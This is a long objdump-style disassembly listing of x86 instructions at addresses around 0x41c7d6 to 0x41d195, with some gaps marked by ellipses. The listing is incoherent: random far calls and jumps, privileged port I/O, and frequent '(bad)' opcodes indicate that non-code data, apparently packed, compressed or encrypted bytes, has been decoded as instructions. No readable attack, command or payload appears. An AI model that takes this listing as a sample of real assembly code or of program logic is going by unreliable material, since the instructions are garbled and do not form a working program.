  41c7d6:	repnz call 0x6068:0xa8c95069
  41c7de:	mov    ebp,0x55718939
  41c7e3:	out    0xe7,al
  41c7e5:	mov    ah,dh
  41c7e7:	cmp    esp,0x37794031
  41c7ed:	imul   ecx,DWORD PTR [ecx],0xffffffe1
  41c7f0:	or     DWORD PTR [eax],ebx
  41c7f2:	or     eax,0x255d0968
  41c7f7:	out    0x20,al
  41c7f9:	call   DWORD PTR [edi]
  41c7fb:	int3   
  41c7fc:	add    eax,0xb2c8f996
  41c801:	mov    dl,0xf0
  41c803:	or     BYTE PTR [ecx+0x57],bh
  41c806:	outs   dx,DWORD PTR ds:[esi]
  41c807:	addr16 jge 0x41c82a
  41c80a:	dec    esi
  41c80b:	in     al,dx
  41c80c:	into   
  41c80d:	mov    bh,ah
  41c80f:	into   
  41c810:	sbb    eax,DWORD PTR [esp+esi*4+0x68668433]
  41c817:	pop    ss
  41c818:	rol    bp,1
  41c81b:	daa    
  41c81c:	dec    ebp
  41c81d:	sub    eax,0x3fa52059
  41c822:	adc    esi,DWORD PTR ds:[esi+ebx*2-0x5]
  41c827:	lods   al,BYTE PTR ds:[esi]
  41c828:	shr    DWORD PTR [eax],cl
  41c82a:	lea    ebx,[ebx]
  41c82c:	or     bh,BYTE PTR [edx-0x42]
  41c82f:	lahf   
  41c830:	mov    ah,0xc8
  41c832:	repz test al,0x27
  41c835:	and    al,0xd5
  41c837:	pushf  
  41c838:	push   ebp
  41c839:	dec    edx
  41c83a:	mov    dh,BYTE PTR cs:[ecx]
  41c83d:	js     0x41c82d
  41c83f:	inc    ebp
  41c840:	hlt    
  41c841:	pop    edi
  41c842:	popf   
  41c843:	stos   BYTE PTR es:[edi],al
  41c844:	loopne 0x41c88c
  41c846:	jae    0x41c871
  41c848:	push   esi
  41c849:	add    eax,DWORD PTR [edi+0x40]
  41c84c:	fidivr WORD PTR [ebx-0x4d]
  41c84f:	pop    eax
  41c850:	inc    eax
  41c851:	and    al,0x85
  41c853:	cmp    dh,BYTE PTR [edi-0x3a]
  41c856:	push   ecx
  41c857:	repnz scas eax,DWORD PTR es:[edi]
  41c859:	xlat   BYTE PTR ds:[ebx]
  41c85a:	sub    eax,0xb61ed844
  41c85f:	pusha  
  41c860:	adc    DWORD PTR [esi-0x1d],eax
  41c863:	xchg   edx,eax
  41c864:	cmp    eax,0x50ddecdb
  41c869:	sub    eax,DWORD PTR [ebp-0x3f]
  41c86c:	ins    DWORD PTR es:[edi],dx
  41c86d:	mov    ah,0xc9
  41c86f:	or     eax,0x8d015640
  41c874:	mov    eax,0x90594d2b
  41c879:	in     al,dx
  41c87a:	mov    ch,0x49
  41c87c:	or     al,0x80
  41c87e:	cld    
  41c87f:	repnz add ebx,ebx
  41c882:	mov    edx,0x1e2e1a7e
  41c887:	jle    0x41c8b3
  41c889:	int3   
  41c88a:	inc    ebp
  41c88b:	fmul   QWORD PTR [ecx]
  41c88d:	xor    ebp,esp
  41c88f:	jp     0x41c8ab
  41c891:	shl    BYTE PTR [eax],1
  41c893:	mov    edi,0x53c3358b
  41c898:	mov    al,ds:0x19fb9d4b
  41c89d:	jbe    0x41c8e1
  41c89f:	repz or BYTE PTR [edi-0x5f1fad3a],bh
  41c8a6:	gs retf 
  41c8a8:	jb     0x41c830
  41c8aa:	push   esp
  41c8ab:	(bad)  
  41c8ac:	inc    BYTE PTR [edx-0x4c]
  41c8af:	add    al,0xb0
  41c8b1:	mov    edi,0x6d884566
  41c8b6:	push   esi
  41c8b7:	mov    dh,0xc4
  41c8b9:	add    BYTE PTR [ecx+0x55],dl
  41c8bc:	or     bh,BYTE PTR [ebx+0x446948]
	...
  41c932:	add    BYTE PTR [eax],al
  41c934:	ret    
  41c935:	mov    esp,0xf87f4844
  41c93a:	iret   
  41c93b:	mov    edi,0x4f0c9749
  41c940:	jo     0x41c945
  41c942:	sbb    ch,BYTE PTR [edi+0x13406]
  41c948:	cmc    
  41c949:	add    BYTE PTR [eax],al
  41c94b:	add    ah,bl
  41c94d:	out    dx,al
  41c94e:	push   0x50
  41c950:	push   0xffffffe8
  41c952:	pop    ebp
  41c953:	call   0xeb0d9a82
  41c958:	inc    ebp
  41c959:	mov    DWORD PTR [eax+0x6dfe32f5],ebx
  41c95f:	and    al,0x7a
  41c961:	stc    
  41c962:	shl    BYTE PTR [esp+esi*4],cl
  41c965:	xchg   DWORD PTR [ebx+eiz*1-0x3ad215e2],esi
  41c96c:	sub    dl,BYTE PTR [esi+0x16]
  41c96f:	ret    
  41c970:	dec    esi
  41c971:	adc    BYTE PTR [edi],0x5b
  41c974:	and    BYTE PTR [edx+0x411c7c3b],al
  41c97a:	xchg   ecx,eax
  41c97b:	mov    BYTE PTR [edi],dh
  41c97d:	dec    esi
  41c97e:	and    DWORD PTR [edi-0x4a],0x65
  41c982:	jne    0x41c979
  41c984:	imul   ebx,DWORD PTR [edi+ecx*1+0xdaccb1],0xffffff85
  41c98c:	sub    al,0x5
  41c98e:	je     0x41c94f
  41c990:	mov    cl,0xd7
  41c992:	fadd   QWORD PTR [ebp+0x65]
  41c995:	jle    0x41c924
  41c997:	sub    DWORD PTR [eax],ebx
  41c999:	iret   
  41c99a:	int3   
  41c99b:	xchg   edi,eax
  41c99c:	mov    cs,WORD PTR [ecx]
  41c99e:	mov    ecx,0x33fd5a41
  41c9a3:	cmp    eax,0xea1ea2f4
  41c9a8:	ss sti 
  41c9aa:	or     eax,DWORD PTR [edx-0x9]
  41c9ad:	ret    
  41c9ae:	adc    eax,0xd86b5bae
  41c9b3:	sti    
  41c9b4:	fisub  WORD PTR [edx-0x6ae1f281]
  41c9ba:	outs   dx,BYTE PTR ds:[esi]
  41c9bb:	fimul  DWORD PTR ss:[ecx]
  41c9be:	stos   DWORD PTR es:[edi],eax
  41c9bf:	rol    al,cl
  41c9c1:	lods   eax,DWORD PTR ds:[esi]
  41c9c2:	jno    0x41ca00
  41c9c4:	mov    WORD PTR [ebp+0x1f],?
  41c9c7:	mov    dh,0xb8
  41c9c9:	push   ds
  41c9ca:	xchg   esp,eax
  41c9cb:	sti    
  41c9cc:	stos   BYTE PTR es:[edi],al
  41c9cd:	xchg   esp,eax
  41c9ce:	or     BYTE PTR [esi+edi*4-0x5093a1b],cl
  41c9d5:	leave  
  41c9d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9d7:	and    BYTE PTR [ebp+0x3b09487c],0x55
  41c9de:	push   ss
  41c9df:	es and al,0x97
  41c9e2:	pop    esi
  41c9e3:	fsubr  QWORD PTR [ecx+eiz*2-0x5eea8577]
  41c9ea:	(bad)  
  41c9eb:	mov    dh,0x7c
  41c9ed:	retf   0xca9a
  41c9f0:	sub    DWORD PTR [ecx-0x13a171c8],edx
  41c9f6:	scas   eax,DWORD PTR es:[edi]
  41c9f7:	mov    ebp,0xf3e4d356
  41c9fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9fd:	pop    edx
  41c9fe:	dec    esp
  41c9ff:	adc    DWORD PTR [eax-0xad51a7d],esp
  41ca05:	ins    BYTE PTR es:[edi],dx
  41ca06:	xlat   BYTE PTR ds:[ebx]
  41ca07:	dec    eax
  41ca08:	jp     0xbbcad687
  41ca0e:	inc    eax
  41ca0f:	xor    al,BYTE PTR [edi-0x5db654b5]
  41ca15:	cmp    bh,BYTE PTR [ecx+ebx*4+0x2c]
  41ca19:	mov    eax,ds:0x6e00fa1f
  41ca1e:	inc    eax
  41ca1f:	cmp    edi,DWORD PTR [eax-0x5c]
  41ca22:	add    BYTE PTR [eax-0x34],0x3
  41ca26:	imul   esp,ebx,0x1b
  41ca29:	add    esp,DWORD PTR [edx]
  41ca2b:	cld    
  41ca2c:	and    ebx,DWORD PTR [ebp+0x7e]
  41ca2f:	jge    0x41ca80
  41ca31:	sub    eax,0xebafb70c
  41ca36:	jne    0x41ca66
  41ca38:	or     esi,DWORD PTR [ecx+0x6eb63b32]
  41ca3e:	mov    edx,0x5d4
	...
  41cab3:	add    BYTE PTR [edx],cl
  41cab5:	mov    eax,0xbfb7aaa5
  41caba:	(bad)  
  41cabc:	sbb    eax,0x72e2887e
  41cac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cac2:	and    DWORD PTR [edx],0xfffffffb
  41cac5:	xor    al,0x1
  41cac7:	add    ch,dh
  41cac9:	add    BYTE PTR [eax],al
  41cacb:	add    BYTE PTR [ecx+0x3],ah
  41cace:	pop    ebx
  41cacf:	sbb    esi,DWORD PTR [eax+0xe]
  41cad2:	add    eax,DWORD PTR [edi+0x59]
  41cad5:	loope  0x41ca9f
  41cad7:	in     al,0x53
  41cad9:	test   BYTE PTR [esi],bh
  41cadb:	cmc    
  41cadc:	adc    ebp,ebp
  41cade:	in     eax,dx
  41cadf:	xchg   edi,esp
  41cae1:	pop    esi
  41cae2:	ins    BYTE PTR es:[edi],dx
  41cae3:	push   ebx
  41cae4:	push   0x87f34a3
  41cae9:	rol    BYTE PTR [ebx],1
  41caeb:	adc    ebx,DWORD PTR [ebp-0x4ae60c58]
  41caf1:	sti    
  41caf2:	inc    esi
  41caf3:	jge    0x41cb14
  41caf5:	inc    esp
  41caf6:	jle    0x41cb13
  41caf8:	sub    dl,BYTE PTR [ebx]
  41cafa:	jnp    0x41cacb
  41cafc:	arpl   di,bx
  41cafe:	into   
  41caff:	sub    BYTE PTR [esi],0xcb
  41cb02:	sub    DWORD PTR [eax-0x4c04678a],edx
  41cb08:	leave  
  41cb09:	pop    ss
  41cb0a:	pop    edx
  41cb0b:	scas   al,BYTE PTR es:[edi]
  41cb0c:	into   
  41cb0d:	xchg   edx,eax
  41cb0e:	lds    esi,FWORD PTR [edi+0x33f9f33a]
  41cb14:	cmp    al,0x91
  41cb16:	and    al,0x42
  41cb18:	and    BYTE PTR [ecx-0x248a9026],dl
  41cb1e:	outs   dx,DWORD PTR ds:[esi]
  41cb1f:	lea    ebp,[edi-0x5c2cfe3e]
  41cb25:	(bad)  [eax+0x3d]
  41cb28:	into   
  41cb29:	lods   al,BYTE PTR ds:[esi]
  41cb2a:	jge    0x41cb44
  41cb2c:	mov    dh,0xd9
  41cb2e:	sub    bl,BYTE PTR [esi-0x76]
  41cb31:	cmp    BYTE PTR [ecx-0x25c9d32d],ah
  41cb37:	mov    DWORD PTR [eax-0x42],0x267248af
  41cb3e:	std    
  41cb3f:	int3   
  41cb40:	(bad)  
  41cb41:	jo     0x41cae1
  41cb43:	(bad)  
  41cb44:	jnp    0x41cb28
  41cb46:	xchg   edx,eax
  41cb47:	xchg   ecx,eax
  41cb48:	inc    eax
  41cb49:	mov    es,WORD PTR [edi+ecx*1]
  41cb4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb4d:	cmp    dl,BYTE PTR [ecx-0x49]
  41cb50:	data16 cmp ah,bl
  41cb53:	mov    bl,0xa2
  41cb55:	sar    bh,cl
  41cb57:	pop    ebx
  41cb58:	lds    ecx,FWORD PTR [ecx+0x67]
  41cb5b:	sub    eax,0xce7cfc18
  41cb60:	dec    edi
  41cb61:	sbb    eax,0x8748274d
  41cb66:	add    eax,0xf64ad80
  41cb6b:	mov    esi,0x5bdd6735
  41cb70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb71:	ror    BYTE PTR [edx+edi*8],0x52
  41cb75:	pop    esp
  41cb76:	sub    eax,0x1188ee0
  41cb7b:	cld    
  41cb7c:	stc    
  41cb7d:	push   edx
  41cb7e:	adc    DWORD PTR [edi],esp
  41cb80:	jl     0x41cb89
  41cb82:	sbb    ah,dl
  41cb84:	xchg   esp,eax
  41cb85:	inc    eax
  41cb86:	out    0x4b,al
  41cb88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb89:	adc    al,0xd
  41cb8b:	xchg   esi,eax
  41cb8c:	adc    al,BYTE PTR [edi]
  41cb8e:	sub    BYTE PTR [esi-0x63],0x25
  41cb92:	jmp    0x39906db6
  41cb97:	xor    ecx,DWORD PTR [ecx+0x3b14010e]
  41cb9d:	or     DWORD PTR [ebp+0x73],esi
  41cba0:	sub    BYTE PTR [ebx+esi*2-0x23beb878],dh
  41cba7:	sub    DWORD PTR [esi-0x5c209556],ecx
  41cbad:	loope  0x41cb92
  41cbaf:	lock scas eax,DWORD PTR es:[edi]
  41cbb1:	add    dh,BYTE PTR [edi-0x5d52f388]
  41cbb7:	cwde   
  41cbb8:	sbb    eax,0x7100eafd
  41cbbd:	je     0x41cbac
  41cbbf:	jg     0x41cb82
	...
  41cc31:	add    BYTE PTR [eax],al
  41cc33:	add    dl,dl
  41cc35:	xor    bh,dl
  41cc37:	clc    
  41cc38:	cli    
  41cc39:	clc    
  41cc3a:	sar    BYTE PTR [edx],cl
  41cc3c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc3e:	inc    eax
  41cc3f:	aam    0x46
  41cc41:	or     DWORD PTR [edx+0x13],0xfffffff0
  41cc45:	xor    eax,0xf50001
  41cc4a:	add    BYTE PTR [eax],al
  41cc4c:	xchg   ebp,eax
  41cc4d:	jb     0x41ccbb
  41cc4f:	mov    ds:0x10dbbdc6,al
  41cc54:	mov    dl,0x6
  41cc56:	loop   0x41cc60
  41cc58:	in     eax,dx
  41cc59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc5a:	dec    edx
  41cc5b:	leave  
  41cc5c:	xor    DWORD PTR [ebx-0x5],ebx
  41cc5f:	sbb    eax,0x163787a5
  41cc64:	mov    esp,0xe3ca84b5
  41cc69:	je     0x41ccae
  41cc6b:	push   es
  41cc6c:	in     eax,dx
  41cc6d:	push   ecx
  41cc6e:	push   ebx
  41cc6f:	pop    es
  41cc70:	add    eax,0x6584e2ff
  41cc75:	pop    esi
  41cc76:	lods   al,BYTE PTR ds:[esi]
  41cc77:	das    
  41cc78:	pop    esi
  41cc79:	pop    ebx
  41cc7a:	sbb    al,0x1e
  41cc7c:	mov    al,0x75
  41cc7e:	inc    eax
  41cc7f:	jle    0x41ccc5
  41cc81:	adc    DWORD PTR [edi+ebx*4],esp
  41cc84:	retf   0x357a
  41cc87:	aaa    
  41cc88:	adc    edi,DWORD PTR ds:0xcea4c1bb
  41cc8e:	cmp    al,0x96
  41cc90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc91:	inc    esp
  41cc92:	mov    ds:0x64639955,eax
  41cc97:	scas   al,BYTE PTR es:[edi]
  41cc98:	sar    DWORD PTR [edi-0x6b65b98b],1
  41cc9e:	and    al,0xe0
  41cca0:	fcomp  st(5)
  41cca2:	sub    DWORD PTR [ecx],0x588e4e93
  41cca8:	mov    eax,ds:0x1eca50d7
  41ccad:	push   ds
  41ccae:	jbe    0x41cc9c
  41ccb0:	cld    
  41ccb1:	cmp    BYTE PTR [ebp+0x2e1b5209],dh
  41ccb7:	stos   DWORD PTR es:[edi],eax
  41ccb8:	test   eax,0x2b8842ab
  41ccbd:	aad    0x51
  41ccbf:	or     BYTE PTR [esi-0x80],ah
  41ccc2:	mov    ebp,0xfc7e5d28
  41ccc7:	out    dx,eax
  41ccc8:	in     al,0x2e
  41ccca:	sub    eax,ebx
  41cccc:	cdq    
  41cccd:	rcr    BYTE PTR [esi-0x49b27abf],cl
  41ccd3:	dec    esp
  41ccd4:	imul   ebp,DWORD PTR [ebp-0x2c],0x5
  41ccd8:	mov    ecx,DWORD PTR [bx+di+0x14e0]
  41ccdd:	jmp    0xf850e900
  41cce2:	adc    ebx,0xa7aaf1b3
  41cce8:	loopne 0x41ccba
  41ccea:	mov    bl,0x2e
  41ccec:	push   cs
  41cced:	ins    BYTE PTR es:[edi],dx
  41ccee:	jmp    0x41ccf0
  41ccf0:	mov    ds:0x8504ffc1,eax
  41ccf5:	cmc    
  41ccf6:	mov    ebx,0xc89f0811
  41ccfb:	sub    ecx,0xfacc5d42
  41cd01:	push   cs
  41cd02:	(bad)  
  41cd03:	mov    al,0x56
  41cd05:	sub    BYTE PTR [ebx-0x16f5e3f6],bh
  41cd0b:	sahf   
  41cd0c:	loop   0x41cd73
  41cd0e:	mov    bl,BYTE PTR [ebx-0x2a]
  41cd11:	mov    ch,ah
  41cd13:	mov    esi,DWORD PTR [esi]
  41cd15:	mov    esi,0xaf35026d
  41cd1a:	test   DWORD PTR [ecx-0x76c9ad05],ecx
  41cd20:	aaa    
  41cd21:	push   ds
  41cd22:	sbb    eax,0x47a1181e
  41cd27:	daa    
  41cd28:	and    eax,0x5c93a5b7
  41cd2d:	add    eax,0x5a5451e0
  41cd32:	arpl   WORD PTR [ebp+ebp*1-0x51],bx
  41cd36:	jg     0x41cd9a
  41cd38:	adc    edi,eax
  41cd3a:	out    dx,al
  41cd3b:	xchg   esi,eax
  41cd3c:	das    
  41cd3d:	arpl   sp,ax
  41cd3f:	add    DWORD PTR fs:[eax],0x0
	...
  41cdb3:	add    BYTE PTR [ebp-0x63956373],al
  41cdb9:	jnp    0x41cdb2
  41cdbb:	out    dx,eax
  41cdbc:	push   ebp
  41cdbd:	call   0x1129:0x5601b1bb
  41cdc4:	in     eax,0x36
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	cmc    
  41cdc9:	add    BYTE PTR [eax],al
  41cdcb:	add    BYTE PTR [esi+0x56cb0ad9],cl
  41cdd1:	pushf  
  41cdd2:	enter  0x3568,0xf5
  41cdd6:	mov    eax,es:0x72cda1c8
  41cddc:	out    dx,al
  41cddd:	(bad)  
  41cdde:	xchg   ebx,eax
  41cddf:	pop    es
  41cde0:	in     al,dx
  41cde1:	inc    edx
  41cde2:	ins    DWORD PTR es:[edi],dx
  41cde3:	jo     0x41ce1b
  41cde5:	inc    esp
  41cde6:	sbb    eax,0xe691e8a6
  41cdeb:	repnz stos BYTE PTR es:[edi],al
  41cded:	cwde   
  41cdee:	ss add eax,0xa24b6623
  41cdf4:	pop    es
  41cdf5:	out    dx,eax
  41cdf6:	pop    ds
  41cdf7:	push   ebx
  41cdf8:	out    0x67,eax
  41cdfa:	cmp    al,0xc0
  41cdfc:	fbstp  TBYTE PTR [ebp+edi*4+0x30]
  41ce00:	pop    esp
  41ce01:	aam    0x6b
  41ce03:	outs   dx,DWORD PTR ds:[esi]
  41ce04:	jno    0x41cd9b
  41ce06:	or     eax,0x24344a7c
  41ce0b:	pop    eax
  41ce0c:	clc    
  41ce0d:	cmp    bh,BYTE PTR [ebx+0x7c]
  41ce10:	xor    DWORD PTR [edx-0x61],eax
  41ce13:	sar    ebx,cl
  41ce15:	in     eax,0xaa
  41ce17:	rcl    DWORD PTR [edx+0x19],1
  41ce1a:	xor    eax,0x65f01c18
  41ce1f:	push   es
  41ce20:	mov    esp,DWORD PTR [edx]
  41ce22:	je     0x41ce90
  41ce24:	addr16 (bad) 
  41ce26:	jge    0x41ce33
  41ce28:	push   ss
  41ce29:	mov    BYTE PTR [eax],bl
  41ce2b:	rol    BYTE PTR [ebx+0x695b33f9],cl
  41ce31:	pop    ds
  41ce32:	leave  
  41ce33:	dec    edx
  41ce34:	pop    ebx
  41ce35:	push   es
  41ce36:	in     al,0x4c
  41ce38:	jbe    0x41ce16
  41ce3a:	or     edi,edi
  41ce3c:	loop   0x41cdec
  41ce3e:	(bad)  
  41ce3f:	push   ebx
  41ce40:	cs mov ebp,0xa5751695
  41ce46:	lahf   
  41ce47:	jge    0x41ce03
  41ce49:	ds dec eax
  41ce4b:	shl    BYTE PTR [edi],1
  41ce4d:	inc    edx
  41ce4e:	jno    0x41ce0f
  41ce50:	shl    DWORD PTR [esi-0x70],cl
  41ce53:	fcomp  DWORD PTR [edi]
  41ce55:	fst    QWORD PTR [ecx]
  41ce57:	shl    DWORD PTR [ecx-0x1d],0xf3
  41ce5b:	dec    esp
  41ce5c:	out    0x77,eax
  41ce5e:	fcomp  st(7)
  41ce60:	fwait
  41ce61:	cs mov dh,0xf2
  41ce64:	add    esp,edx
  41ce66:	out    dx,al
  41ce67:	outs   dx,BYTE PTR ds:[esi]
  41ce68:	sbb    DWORD PTR [eax+esi*8],0x7a
  41ce6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce6d:	(bad)  
  41ce6e:	out    0x9d,al
  41ce70:	repnz out dx,eax
  41ce72:	and    al,BYTE PTR [edi+0x49]
  41ce75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce76:	xchg   edi,eax
  41ce77:	retf   
  41ce78:	shr    BYTE PTR [ecx+0x74d6baf2],0x80
  41ce7f:	test   BYTE PTR [eax-0x3e],cl
  41ce82:	outs   dx,DWORD PTR ds:[esi]
  41ce83:	stos   DWORD PTR es:[edi],eax
  41ce84:	and    eax,0xd0670e8a
  41ce89:	jp     0x41ce92
  41ce8b:	mov    eax,0x86747c19
  41ce90:	arpl   di,si
  41ce92:	xchg   esp,eax
  41ce93:	out    dx,al
  41ce94:	imul   esi,DWORD PTR [ecx+0x29],0x4c2e4f49
  41ce9b:	popa   
  41ce9c:	pusha  
  41ce9d:	retf   
  41ce9e:	jne    0x41ce92
  41cea0:	sbb    al,0x7
  41cea2:	rcr    DWORD PTR [edi+0xd6c0ec7],cl
  41cea8:	bound  ecx,QWORD PTR [eax-0x3]
  41ceab:	add    eax,0x4cadc8c3
  41ceb0:	lods   eax,DWORD PTR ds:[esi]
  41ceb1:	out    dx,al
  41ceb2:	push   ss
  41ceb3:	mov    ecx,0x493aa94f
  41ceb8:	fbstp  TBYTE PTR [edx+0xc]
  41cebb:	adc    eax,0x923dd83d
  41cec0:	sbb    al,0x0
	...
  41cf32:	add    BYTE PTR [eax],al
  41cf34:	fs jae 0x41cf6a
  41cf37:	es aaa 
  41cf39:	data16 jne 0x41cfaf
  41cf3c:	cmc    
  41cf3d:	jle    0x41cf41
  41cf3f:	dec    esi
  41cf40:	pop    ss
  41cf41:	lods   eax,DWORD PTR ds:[esi]
  41cf42:	jecxz  0x41cf2d
  41cf44:	fidiv  DWORD PTR [edi]
  41cf46:	add    DWORD PTR [eax],eax
  41cf48:	cmc    
  41cf49:	add    BYTE PTR [eax],al
  41cf4b:	add    bh,ah
  41cf4d:	js     0x41cf99
  41cf4f:	push   ss
  41cf50:	and    ecx,DWORD PTR ds:0x65ae126
  41cf56:	fcom   DWORD PTR [ebp-0x14]
  41cf59:	setl   BYTE PTR [ebp-0x61]
  41cf5d:	dec    edx
  41cf5e:	pop    ss
  41cf5f:	dec    BYTE PTR [edx-0x7d2cff17]
  41cf65:	neg    bh
  41cf67:	stos   BYTE PTR es:[edi],al
  41cf68:	in     eax,dx
  41cf69:	stos   DWORD PTR es:[edi],eax
  41cf6a:	fst    QWORD PTR [edi-0x6c4d675e]
  41cf70:	mov    eax,esi
  41cf72:	xor    al,0x91
  41cf74:	sub    BYTE PTR [esi+0x34d019ce],dl
  41cf7a:	ja     0x41cf04
  41cf7c:	mov    WORD PTR [ecx-0xaad2758],?
  41cf82:	inc    edx
  41cf83:	mov    dl,0xc9
  41cf85:	cmp    BYTE PTR [edx-0x35],0x45
  41cf89:	out    dx,al
  41cf8a:	sbb    ch,BYTE PTR [esi+0x7b]
  41cf8d:	popf   
  41cf8e:	xchg   ecx,eax
  41cf8f:	mov    bl,0xf1
  41cf91:	dec    esi
  41cf92:	hlt    
  41cf93:	push   eax
  41cf94:	into   
  41cf95:	(bad)  
  41cf96:	out    dx,eax
  41cf97:	lods   eax,DWORD PTR ds:[esi]
  41cf98:	add    bl,bh
  41cf9a:	cwde   
  41cf9b:	arpl   WORD PTR [edx-0xba901dc],cx
  41cfa1:	fistp  DWORD PTR cs:[edi+0x42]
  41cfa5:	loope  0x41d00c
  41cfa7:	clc    
  41cfa8:	fadd   st,st(7)
  41cfaa:	or     ecx,DWORD PTR [edx+esi*2-0x74]
  41cfae:	jg     0x41cfba
  41cfb0:	or     eax,0xbe6dedf
  41cfb5:	fmul   QWORD PTR [esi-0x13]
  41cfb8:	adc    bl,cl
  41cfba:	and    eax,DWORD PTR [ecx-0x9]
  41cfbd:	stc    
  41cfbe:	daa    
  41cfbf:	call   0xca0c:0xc9db6191
  41cfc6:	repnz imul ebp,DWORD PTR ds:0x9ea73b00,0x59
  41cfce:	popf   
  41cfcf:	popa   
  41cfd0:	scas   eax,DWORD PTR es:[edi]
  41cfd1:	dec    ebx
  41cfd2:	daa    
  41cfd3:	push   eax
  41cfd4:	aam    0x72
  41cfd6:	dec    ebx
  41cfd7:	in     eax,dx
  41cfd8:	sti    
  41cfd9:	leave  
  41cfda:	sbb    al,0xcc
  41cfdc:	jmp    0x3b83:0x11e4bd0f
  41cfe3:	push   eax
  41cfe4:	mov    bl,0xb0
  41cfe6:	push   cs
  41cfe7:	pusha  
  41cfe8:	(bad)  
  41cfe9:	rcr    BYTE PTR [eax+0x75fa62ad],1
  41cfef:	jno    0x41d03d
  41cff1:	mov    dh,0x10
  41cff3:	iret   
  41cff4:	mov    ebp,0x248a556a
  41cff9:	sub    eax,ebp
  41cffb:	in     al,0x75
  41cffd:	dec    edi
  41cffe:	retf   0x9562
  41d001:	pop    ds
  41d002:	inc    ebp
  41d003:	jnp    0x41d02d
  41d005:	in     al,0x74
  41d007:	call   0xe058793b
  41d00c:	rcl    DWORD PTR [ebx-0xbbfc1e0],cl
  41d012:	rcr    BYTE PTR [edi],cl
  41d014:	dec    ebx
  41d015:	cwde   
  41d016:	xor    BYTE PTR [eax-0x105ba0a6],dl
  41d01c:	fiadd  DWORD PTR [esi]
  41d01e:	dec    ecx
  41d01f:	sub    BYTE PTR [edi],cl
  41d021:	lock push eax
  41d023:	pop    es
  41d024:	dec    eax
  41d025:	leave  
  41d026:	sub    eax,0x90384bdc
  41d02b:	pop    DWORD PTR [eax+0x15]
  41d02e:	jns    0x41d00d
  41d030:	(bad)  
  41d032:	stc    
  41d033:	jmp    0x41d058
  41d035:	xchg   esi,eax
  41d036:	cs cdq 
  41d038:	fs sub al,0x51
  41d03b:	nop
  41d03c:	add    eax,eax
  41d03e:	loope  0x41d024
  41d040:	imul   eax,DWORD PTR [eax],0x0
	...
  41d0b2:	add    BYTE PTR [eax],al
  41d0b4:	(bad)  [edx-0x5f]
  41d0b7:	clc    
  41d0b8:	mov    bl,0xfb
  41d0ba:	fldcw  WORD PTR [ebx-0x56]
  41d0bd:	cwde   
  41d0be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0bf:	sbb    BYTE PTR ds:0xcf5ab28f,0x38
  41d0c6:	add    DWORD PTR [eax],eax
  41d0c8:	cmc    
  41d0c9:	add    BYTE PTR [eax],al
  41d0cb:	add    BYTE PTR [ebp+ecx*2-0x3f],dl
  41d0cf:	jmp    0x5520caba
  41d0d4:	fcmovne st,st(7)
  41d0d6:	sbb    DWORD PTR [eax+eax*4-0x52],edx
  41d0da:	aam    0xf
  41d0dc:	dec    ebp
  41d0dd:	fwait
  41d0de:	sbb    eax,0xa02bb18a
  41d0e3:	stos   DWORD PTR es:[edi],eax
  41d0e4:	sbb    eax,DWORD PTR [edi+0x1d65b3e4]
  41d0ea:	xlat   BYTE PTR ds:[ebx]
  41d0eb:	sub    BYTE PTR [edi+0x3948ea84],ch
  41d0f1:	fsubr  QWORD PTR [eax]
  41d0f3:	jae    0x41d0b3
  41d0f5:	cld    
  41d0f6:	sub    eax,0x39c5f07a
  41d0fb:	jae    0x41d144
  41d0fd:	in     eax,dx
  41d0fe:	and    esp,edx
  41d100:	in     eax,0x26
  41d102:	sbb    BYTE PTR [edx-0x193c57fd],dh
  41d108:	aam    0xb5
  41d10a:	sbb    eax,0xe16bc204
  41d10f:	xor    dh,BYTE PTR [ebx+0x251b3940]
  41d115:	hlt    
  41d116:	sbb    BYTE PTR [ecx-0x1a50a314],ch
  41d11c:	shr    ecx,cl
  41d11e:	and    al,0xd5
  41d120:	add    eax,0x74ee460f
  41d125:	cs imul ecx
  41d128:	or     al,BYTE PTR [edi]
  41d12a:	xor    DWORD PTR [edx-0x6df13504],esi
  41d130:	retf   
  41d131:	ror    ah,1
  41d133:	push   ebx
  41d134:	mov    ecx,0xf4f3e718
  41d139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d13a:	fisub  DWORD PTR [edx+ebp*1]
  41d13d:	(bad)  
  41d13f:	mov    gs,ebx
  41d141:	cwde   
  41d142:	cmp    BYTE PTR [ebx+0x633e1de2],0x9c
  41d149:	pop    esi
  41d14a:	pop    eax
  41d14b:	repnz test BYTE PTR [esp+esi*2-0x3],bh
  41d150:	inc    ebp
  41d151:	and    al,ah
  41d153:	rol    DWORD PTR [ebp-0x50],1
  41d156:	gs retf 0x3238
  41d15a:	jmp    0x42ef89aa
  41d15f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d160:	pop    ebx
  41d161:	cmp    esp,ebp
  41d163:	mov    WORD PTR [edi+0x75ae6d34],?
  41d169:	test   BYTE PTR [esi+0x79],ch
  41d16c:	das    
  41d16d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d16e:	lahf   
  41d16f:	cmp    DWORD PTR [edx+0xb5f2722],eax
  41d175:	sub    esi,edi
  41d177:	retf   
  41d178:	cli    
  41d179:	(bad)  
  41d17a:	into   
  41d17b:	sub    DWORD PTR [edx],0x58
  41d17e:	xor    BYTE PTR [ecx+eax*4-0x4932ad4c],ah
  41d185:	mov    fs,WORD PTR [eax]
  41d187:	inc    edi
  41d188:	add    bl,bl
  41d18a:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41d18c:	in     al,dx
  41d18d:	mov    cl,0xd4
  41d18f:	lahf   
  41d190:	push   edx
  41d191:	popa   
  41d192:	jb     0x41d20d
  41d194:	sahf   
  41d195:	mov    ecx,0x3c9e7dc5
